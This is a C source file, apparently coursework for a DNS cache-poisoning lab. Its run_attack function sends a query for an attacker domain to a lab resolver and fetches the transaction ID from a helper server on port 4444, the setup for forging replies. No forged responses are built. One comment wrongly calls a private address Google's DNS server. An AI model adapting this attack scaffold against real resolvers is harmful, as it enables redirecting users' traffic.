#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>

#define DNS_SERVER_IP "192.168.1.203" // Google's public DNS server
#define DNS_SERVER_PORT 53      // Standard DNS port
#define BUFFER_SIZE 512         // Buffer size for the DNS query and response
#define INFO_SERVER_IP "192.168.1.201" // Server providing initial information
#define INFO_SERVER_PORT 4444          // Port for receiving info

int build_dns_query(unsigned char *buffer, const char *hostname);

int fetch_txid_from_server(unsigned short *txid) {
    int sockfd;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];
    socklen_t server_addr_len = sizeof(server_addr);

    // Step 1: Create a UDP socket
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        return -1;
    }

    // Step 2: Configure the server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(INFO_SERVER_PORT);
    inet_pton(AF_INET, INFO_SERVER_IP, &server_addr.sin_addr);

    // Step 3: Send a request to the server
    const char *request = "Request TXID";
    if (sendto(sockfd, request, strlen(request), 0, (struct sockaddr *)&server_addr, server_addr_len) < 0) {
        perror("Failed to send request to server");
        close(sockfd);
        return -1;
    }
    
    // Step 4: Receive the TXID from the server
    int received_len = recvfrom(sockfd, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&server_addr, &server_addr_len);
    if (received_len < 0) {
        perror("Failed to receive data from server");
        close(sockfd);
        return -1;
    }

    buffer[received_len] = '\0';
    printf("Received from server: %s\n", buffer);

    // Parse the TXID
    if (sscanf(buffer, "TXID: %hu", txid) != 1) {
        fprintf(stderr, "Failed to parse TXID from server response\n");
        close(sockfd);
        return -1;
    }

    // Close the socket
    close(sockfd);
    return 0;
}


int socket_creation(struct sockaddr_in *server_addr){
    // Create a socket
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Configure the server address
    printf("configure the server address \n");
    memset(server_addr, 0, sizeof(*server_addr));
    (*server_addr).sin_family = AF_INET;
    (*server_addr).sin_port = htons(INFO_SERVER_PORT);
    inet_pton(AF_INET, INFO_SERVER_IP, &server_addr->sin_addr);

    // Connect to the server
    printf("connect to the server\n");
    if (connect(sockfd, (struct sockaddr *)server_addr, sizeof(*server_addr)) < 0) {
        perror("Connection to info server failed");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    return sockfd;
}

// Function to communicate with the info server and get the txid
void run_attack(unsigned short *txid_ls) {
    // connect to server attacker
    // int sockfd1;
    // struct sockaddr_in server_addr1;
    // char txid_buffer[BUFFER_SIZE];
    // unsigned short txid = 0;

    // sockfd1 = socket_creation(&server_addr1);
    
    // printf("Attacker server connected: %s:%d\n", inet_ntoa(server_addr1.sin_addr), ntohs(server_addr1.sin_port));
    
    // send the DNS request  ################ step 1 #####################
    const char *hostname = "www.attacker.cybercourse.com";
    int sockfd;
    struct sockaddr_in server_addr;
    unsigned char buffer[BUFFER_SIZE];

    // Step 1: Create a UDP socket
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }
    // Step 2: Configure the DNS server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(DNS_SERVER_PORT);
    inet_pton(AF_INET, DNS_SERVER_IP, &server_addr.sin_addr);
    printf("step 2 done\n");
    // Step 3: Build the DNS query
    int query_len = build_dns_query(buffer, hostname);
    printf("step 3 done\n");
    // Step 4: Send the DNS query
    if (sendto(sockfd, buffer, query_len, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Failed to send DNS query");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    
    close(sockfd);

    unsigned short txid = 0;
    fetch_txid_from_server(&txid);
    printf("txid got form server is %d", txid);
    // // Receive the txid from the server
    // int bytes_received = recv(sockfd, txid_buffer, BUFFER_SIZE - 1, 0);
    // if (bytes_received < 0) {
    //     perror("Failed to receive data from info server");
    //     close(sockfd);
    //     exit(EXIT_FAILURE);
    // }

    // txid_buffer[bytes_received] = '\0'; // Null-terminate the received string
    // printf("Received from server: %s\n", txid_buffer);

    // // Parse the txid
    // if (sscanf(txid_buffer, "TXID: %hu", &txid) != 1) {
    //     fprintf(stderr, "Failed to parse TXID from server response\n");
    //     close(sockfd);
    //     exit(EXIT_FAILURE);
    // }

    // printf("Extracted TXID: %u\n", txid);
    txid_ls[0]= txid;
    // // Close the connection
}


// Function to build a DNS query
int build_dns_query(unsigned char *buffer, const char *hostname) {
    int query_len = 0;
    unsigned short txid = htons(0x1234); // Transaction ID
    unsigned short flags = htons(0x0100); // Standard query
    unsigned short q_count = htons(1);   // 1 question
    unsigned short ans_count = 0;        // No answers
    unsigned short auth_count = 0;       // No authority
    unsigned short add_count = 0;        // No additional

    // Header section
    memcpy(buffer + query_len, &txid, 2);
    query_len += 2;
    memcpy(buffer + query_len, &flags, 2);
    query_len += 2;
    memcpy(buffer + query_len, &q_count, 2);
    query_len += 2;
    memcpy(buffer + query_len, &ans_count, 2);
    query_len += 2;
    memcpy(buffer + query_len, &auth_count, 2);
    query_len += 2;
    memcpy(buffer + query_len, &add_count, 2);
    query_len += 2;
    printf("got here \n");
    // Question section (convert hostname to DNS format)
    char buffer2[512];
    strcpy(buffer2, hostname);
    const char *token = strtok((char *)buffer2, ".");
    printf("got here \n");
    while (token) {
        size_t len = strlen(token);
        buffer[query_len++] = (unsigned char)len;
        memcpy(buffer + query_len, token, len);
        query_len += len;
        token = strtok(NULL, ".");
        printf("got here \n");
    }

    buffer[query_len++] = 0; // End of hostname

    // Question Type (A record)
    unsigned short qtype = htons(1); // Type A
    memcpy(buffer + query_len, &qtype, 2);
    query_len += 2;

    // Question Class (IN)
    unsigned short qclass = htons(1); // Class IN
    memcpy(buffer + query_len, &qclass, 2);
    query_len += 2;

    return query_len;
}

// Function to send the DNS query and receive a response
void send_dns_query(const char *hostname) {
    int sockfd;
    struct sockaddr_in server_addr;
    unsigned char buffer[BUFFER_SIZE];

    // Step 1: Create a UDP socket
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }
    // Step 2: Configure the DNS server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(DNS_SERVER_PORT);
    inet_pton(AF_INET, DNS_SERVER_IP, &server_addr.sin_addr);
    printf("step 2 done\n");
    // Step 3: Build the DNS query
    int query_len = build_dns_query(buffer, hostname);
    printf("step 3 done\n");
    // Step 4: Send the DNS query
    if (sendto(sockfd, buffer, query_len, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Failed to send DNS query");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    printf("DNS query sent for hostname: %s\n", hostname);

    // // Step 5: Receive the DNS response
    // socklen_t server_addr_len = sizeof(server_addr);
    // int response_len = recvfrom(sockfd, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&server_addr, &server_addr_len);
    // if (response_len < 0) {
    //     perror("Failed to receive DNS response");
    //     close(sockfd);
    //     exit(EXIT_FAILURE);
    // }

    // printf("DNS response received (%d bytes).\n", response_len);

    // Optional: Print the raw DNS response
    // printf("Raw DNS Response:\n");
    // for (int i = 0; i < response_len; i++) {
    //     printf("%02x ", buffer[i]);
    //     if ((i + 1) % 16 == 0) printf("\n");
    // }
    // printf("\n");

    // Step 6: Close the socket
    close(sockfd);
}

int main() {
    unsigned short txid[10];

    // Step 1: Get the TXID from the info server
    run_attack(txid);

    //send_dns_query(hostname);
    return 0;
}

